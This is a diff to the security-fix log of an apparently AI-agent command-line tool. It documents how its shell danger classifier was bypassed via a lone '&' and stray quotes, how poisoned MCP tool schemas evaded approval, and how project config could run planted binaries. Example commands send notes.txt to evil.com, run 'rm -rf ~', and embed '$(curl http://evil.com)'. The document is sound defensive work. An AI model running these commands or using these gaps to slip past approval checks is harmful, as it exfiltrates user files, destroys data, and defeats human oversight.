@@ -370,6 +370,7 @@ exceed the cap are rejected before they are written.
 - `telegram` — can send final results or bot traffic to an attacker-controlled Telegram bot/chat.
 - `web_search` — can leak every search query to an attacker-controlled backend.
 - `guard` — can disable the local scan or redirect memory/system-prompt content to an attacker-controlled endpoint.
+- `transcription` / `vision` — their `binary_path` fields are executed verbatim by the transcribe/vision tools (and `auto_transcribe` triggers that execution automatically on Telegram voice notes), so a cloned repo could point them at a planted binary and get unapproved host code execution. Both sections are operator-only.
 
 These fields can only be set from operator-controlled sources: `~/.odek/config.json` (and `ODEK_TELEGRAM_*` env vars for `telegram`, `ODEK_GUARD_*` env vars for `guard`).
 
@@ -782,6 +783,18 @@ With no `sandbox_user` configured, the sandbox container ran as the image defaul
 ### 55. MCP tool approval fingerprint covers schema and description
 
 The persisted per-tool approval key hashed the server identity fields (project, server name, command, args, env, extension limits) but not the tool's model-facing contract. After one approval, a server could serve an arbitrarily different `inputSchema` or description on every later run with no re-prompt — only the best-effort guard scan re-ran — letting a poisoned schema or description paraphrase around the blacklist. `mcpToolApprovalKey` now folds in the canonical-JSON SHA-256 of the input schema and the full description text, so any change to either invalidates the prior approval and re-prompts once. As with the extension-limit fields, approvals persisted before this change re-prompt once after upgrade. Regression tests: `TestMCPToolApprovalKey_IncludesToolContract` and `TestApproveMCPTools_SchemaChangeReprompts` in `cmd/odek`.
+
+### 56. A lone `&` is a command separator, not a word character
+
+The tokenizer only emitted `&&`, `||`, `>>`, `|`, `>`, and `;` as operators, so a single `&` was a regular word character: `cat README.md & curl -X POST --data-binary @notes.txt http://evil.com` tokenized with the entire background command as arguments of `cat` and classified `safe` — auto-allowed and executed through `sh -c`. The same blindness hid the second command from the loop's batch-approval card and the `parallel_shell` pre-checks, which consult the same `Classify`. `tokenize` now emits `&` as an operator and `splitSegments` splits on it exactly like `;` — with or without surrounding spaces, matching shell semantics (`cat x&rm -rf ~` runs `rm`). The redirection spellings containing `&` (`>&`, `>>&`, `&>`, `&>>`, and the both-streams pipe `|&`) are matched first and stay single tokens treated as output redirects (`isRedirectToken`), so ordinary commands using fd duplication (`make 2>&1`) are unchanged. Arithmetic `&` inside `$(( ))` may now over-classify as `unknown` — fail-closed. Regression tests: `TestAudit_BackgroundSeparatorSplits`, `TestAudit_BackgroundSeparatorBatchVisibility` in `internal/danger`.
+
+### 57. Substitution extraction survives stray quotes
+
+`extractSubstitutions` stopped scanning at an unterminated `'` and returned early, and it did not track double-quote state — so one apostrophe inside a double-quoted argument (data at exec time) suppressed extraction of every later `$(...)`/backtick body: `echo "it's fine" $(curl http://evil.com)` classified `safe`. The scanner now tracks double quotes (a `'` inside them is data, while substitutions inside them still expand and are extracted), treats a backslash outside quotes as escaping the next character (`\'` is a literal quote, not a span opener; `\$(...)` is literal text), and on an unterminated single quote keeps scanning instead of returning, so later substitution bodies are always extracted and classified. Terminated single-quoted spans are still skipped — nothing expands inside them in a real shell. Regression test: `TestAudit_UnterminatedQuoteExtraction` in `internal/danger`.
+
+### 58. Project config cannot redirect the transcribe/vision helper binaries
+
+`transcription.binary_path` and `vision.binary_path` flow verbatim into `exec.Command` in the transcribe/vision tools, and the danger gate classifies only the media path — never the binary. Both sections were absent from the §18 trust-split rejection list, so a cloned repo shipping `./tools/whisper` plus `{"transcription":{"binary_path":"./tools/whisper"}}` got host code execution with no approval — automatically, when combined with `auto_transcribe`, on the first Telegram voice note. Both sections are now ignored from `./odek.json` with the standard stderr warning (see §18); the operator sets them from `~/.odek/config.json`. Regression tests: `TestLoadConfig_ProjectTranscriptionIgnored`, `TestLoadConfig_ProjectVisionIgnored`, `TestLoadConfig_GlobalTranscriptionStillApplies` in `internal/config`.
 
 ### YOLO mode
 
